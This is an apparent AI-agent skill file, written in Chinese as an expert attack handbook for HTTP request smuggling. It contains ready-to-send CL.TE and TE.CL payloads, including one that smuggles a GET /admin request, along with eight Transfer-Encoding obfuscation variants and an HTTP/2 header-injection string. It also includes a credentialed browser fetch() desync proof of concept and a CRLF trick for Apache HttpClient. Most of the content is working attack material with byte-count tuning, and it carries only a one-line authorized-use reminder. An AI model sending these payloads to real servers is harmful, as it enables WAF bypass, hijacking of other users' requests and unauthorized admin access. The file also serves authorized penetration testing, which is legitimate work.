# 技能：HTTP请求走私 — 专家攻击手册

> **AI加载指令**：专家级HTTP失同步技术。涵盖CL.TE、TE.CL、TE.TE混淆变种，HTTP/2降级和伪头部混淆，客户端失同步（浏览器`fetch`管道），以及工具辅助模糊测试。假设熟悉原始HTTP/1.1帧和反向代理拓扑。这不是“头部注入”——它是**消息边界不一致**。

路由提示：当怀疑CDN/反向代理与源站对请求边界不一致时加载此技能，或当H2到H1降级过程中出现异常连接时。

## 0. 相关路由

- [ghost-bits-cast攻击](../ghost-bits-cast-attack/SKILL.md) 当HTTP客户端库为**Apache HttpClient <= 4.5.9** (HTTPCLIENT-1974/1978) — 向头部值注入`瘍瘊` (U+760D U+760A, 低字节`\r\n`) 会导致底层字符到字节的写入器发出字面CRLF，在源站拆分请求而不依赖CL/TE不一致

## 1. 快速入门

### CL.TE首次探测（前端信任CL，后端信任分块）

假设：前端优先考虑`Content-Length`，后端优先考虑`Transfer-Encoding: chunked`。使用一个非常短的CL，使前端接受假结束，而后端继续分块解析并将剩余字节留给下一个请求。

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- 前端根据`Content-Length: 13`只读取13字节（即`0\r\n\r\nSMUGGLED`，总共13字节）并认为请求完成。
- 后端解析为分块：在`0`结束块之后，它将**`SMUGGLED`及之后**视为**下一个请求**的起始字节流。

### TE.CL首次探测（前端信任分块，后端信任CL）

假设：前端解析分块，后端只读取`Content-Length`。设置**CL等于块长度行的字节数**（通常`4`：两个十六进制字符+`\r\n`），使后端只消费长度行并将剩余字节缓冲以拼接后续请求。

在块中嵌入第二个请求（所有行尾均为**CRLF**；十六进制块长度`35` = 53字节）：

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

在网络上，块体必须正好为53字节；如果你更改路径/头部，请重新计算块长度并相应更新十六进制长度行。

### 安全提示

仅在**授权范围内**测试；并发走私可能污染连接池、损坏缓存或影响其他租户。优先选择隔离环境或低流量时段。

---

## 1. 核心概念

**定义**：两个（或更多）HTTP处理实体在**同一TCP/TLS流**中对请求一结束和请求二开始的位置存在分歧，允许攻击者在逻辑请求中包含**部分或全部**第二个请求。

```
  客户端          前端（代理/WAF）              后端（源站）
     |                     |                            |
     |==== 请求A+B  ===>|                            |
     |                     | 解析边界 #1         | 解析边界 #2
     |                     |         \                  |         /
     |                     |          不同的拆分点
     |                     |                            |
     v                     v                            v
                   请求A（所见）              请求A' + 走私的B
```

**与CRLF注入的区别**：CRLF通常注入到**响应**或**头部行**；走私针对RFC 7230消息帧实现差异（`Content-Length` / `chunked`）。

**高价值影响**：WAF规则绕过（走私体在前端请求中不可见），劫持共享源站连接上的其他用户请求（队列中毒），缓存中毒辅助，以及认证边界混淆。

---

## 2. CL.TE漏洞

**模式**：前端信任**`Content-Length`**；后端信任**`Transfer-Encoding: chunked`**。

**精确示例**（与§0相同）：`Content-Length: 13` 和 `Transfer-Encoding: chunked` 都存在，体为：

```text
0\r\n\r\nSMUGGLED
```

字节计数：`0` + `\r\n` + `\r\n` + `SMUGGLED` = 13。

**后端视角**：分块流在`0\r\n\r\n`结束；如果`SMUGGLED`以`METHOD SP`或另一个有效请求前缀开头，它将成为**走私的请求行前缀**。

**调优**：如果目标是敏感于重复头部、大小写或空格，最小化调整`Transfer-Encoding`变体（见§4）以保留语义以匹配前端忽略TE而后端执行TE的组合。

---

## 3. TE.CL漏洞

**模式**：前端解析**分块**；后端只读取**`Content-Length`**（或过短的CL）。

**意图**：前端将整个恶意字节流视为体；后端读取CL长度，将剩余字节缓冲以拼接后续合法请求。

**完整的TE.CL与嵌入的第二个请求**（与§0同系列；`Content-Length: 4` + 第一个块长度行`35\r\n`）：

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

解释：

- **后端（CL）**：从消息体开始读取仅4字节 -> `3` `5` `\r` `\n`，标记体完成，并将剩余字节留在TCP读缓冲区。
- **前端（TE）**：解析完整流为分块，并将`GET /admin...`作为**已关闭的第一个请求**的体内容（产品相关）；与后端边界解释的失配形成TE.CL。

对于更长的走私（例如，`POST` + `Content-Length: 11` + `x=1`），块长度约为`76`（十六进制`0x76` = 118字节）；`Content-Length: 4`仍可固定后端仅读取长度行。

**实用提示**：块长度必须是有效的十六进制；第二个请求必须满足目标对Host、路径和会话cookie的预期；时间窗口和连接重用策略决定了你是否会命中其他用户的请求。

---

## 4. TE.TE漏洞

**模式**：前端和后端都声称处理`Transfer-Encoding`，但差异在于哪个TE值有效或有效 -> 仍然产生等效失同步，其中一方看到分块而另一方不看到。

使用以下**8种混淆变体**探测解析差异（单行显示；`\t`表示真实制表符）：

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
（将`[TAB]`替换为真实的`\x09`。）

```http
 Transfer-Encoding: chunked
```
（行首有一个空格。）

```http
X: X
Transfer-Encoding: chunked
```
（前一行值是`X`，下一行以`Transfer-Encoding`开头：这使用**行延续/宽松头部解析**，因此一个跳过可能会错误地合并或拆分行；`X`和`Transfer-Encoding`之间的分隔符可能是`\n`或`\r\n`，具体取决于目标堆栈。）

```http
Transfer-Encoding
: chunked
```
（字段名和冒号位于**不同的物理行**；某些解析器仍将其视为有效的`Transfer-Encoding: chunked`。）

**策略**：对于每一对（前端，后端），枚举哪一方接受每个变体作为`chunked`，然后映射到等效的CL.TE或TE.CL（使用§2/§3）。

---

## 5. HTTP/2请求走私

### H2 -> H1降级

常见场景：边缘支持HTTP/2，源站使用HTTP/1.1。如果实现不严格规范化头部字段和体边界，你可能会观察到：

- 不正确的伪头部到常规头部映射顺序；
- 禁止头部（如某些`Connection`组合）错误转发；
- 复制头部合并规则与源站不一致。

### 伪头部/头部注入走私（概念载荷）

攻击面来自下游H1解析器将某些字节视为**新请求的起始**。常见的研究/CTF方法是在一个层忽略但另一个层视为字面值的头部值中放置接近请求的字节：

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**含义**：如果一层在头部值中保留完整字符串，下一层在H1重建过程中错误拆分，解析可能会在`\r\n\r\n`处开始一个新的`GET / HTTP/1.1`。

**测试方向**：

- H2中`Transfer-Encoding` / `Content-Length`的重复和大小写处理（H2要求小写，但转换层可能失败）；
- 当`:method`或`:path`包含异常字符时的降级行为；
- 隧道或扩展CONNECT与走私的交互。

---

## 6. 客户端失同步

**场景**：浏览器请求体处理与中间件/源站不同，或**`no-cors` + 预检豁免**允许创建类似经典CL.TE/TE.CL的队列效果（架构依赖）。

**HEAD + GET链**：某些堆栈历史上错误处理HEAD响应体、后续管道或连接重用；通过具体浏览器版本和目标代理行为进行验证。

**JavaScript POC形状**（说明性：将体设置为包含`GET`的原始字节，`no-cors`和凭证）：

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**注意**：浏览器安全模型限制了直接可读性；成功通常表现为同一连接上对其他请求的副作用或异常服务器日志/行为，而不是直接读取响应。结合SOP、CORS和扩展/代理因素进行评估。

---

## 7. 工具

| 工具 | 目的 |
|------|------|
| **Burp Suite — HTTP请求走私器** (BApp Store) | 自动失同步检测、常见变体、时间差检查 |
| **defparam/smuggler** (GitHub) | 批量生成/发送走私探测的Python脚本 |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | 快速组装原始CL.TE / TE.CL消息模板 |

**使用建议**：首先被动确认**前端+源站**的两跳路径，然后选择最小干扰的探测，并在生产中降低并发。

---

## 8. 检测决策树

```
                        开始：反向代理/CDN在路径中？
                                    |
                    否 -------------+------------- 是
                    |                               |
            低级经典走私                    |
            （仍测试H2失同步）                   v
                                            你能一起发送TE + CL吗？
                                                    |
                              否 -------------------+------------------- 是
                              |                                         |
                      测试仅H2问题                    前端优先什么？
                      （伪头部、重置）                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL获胜                          TE获胜                         错误/
                                        |                               |                          连接
                                        v                               v                               |
                                   CL.TE探测                    TE.CL探测                    TE.TE混淆
                                   (§0,2)                       (§0,3)                       (§4)
                                        |                               |                               |
                                        v                               v                               v
                              时间/内容/                    调整块大小                     成对矩阵：
                              队列中毒信号？                            对齐                     哪一跳接受
                                        |                               |                               哪个变体?
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              用第二个走私请求确认
                                                              （重放安全）
                                                              或Collaborator风格的侧信号
```

---

### 高级参考

加载[H2_SMUGGLING_VARIANTS.md](./H2_SMUGGLING_VARIANTS.md)时需要：
- H2.CL和H2.TE变体，带字节级载荷示例
- CL.0（连接关闭失同步） — 技巧和检测
- 胖GET请求走私（体在GET请求中）
- 请求走私→缓存中毒链（响应队列失配）
- 客户端失同步（CSD）通过浏览器Fetch API与JavaScript POC模板
- CDN/反向代理产品行为矩阵（HAProxy、Nginx、Apache、Cloudflare、AWS ALB、Envoy、Varnish等）

---

## 12. 相关路由

- **输入进入解释器/查询语言/模板**（不是HTTP帧） -> [注入测试路由](../injection-checking/SKILL.md)（然后深入XSS、SQLi、SSTI等）。
- **响应头部拆分 / Location CRLF** -> [CRLF注入](../crlf-injection/SKILL.md)。
- **缓存和路径键混淆** -> [Web缓存欺骗](../web-cache-deception/SKILL.md)。

一旦确认是**HTTP消息边界**问题而非参数注入，**停留在该技能**以避免误路由到一般注入工作流。
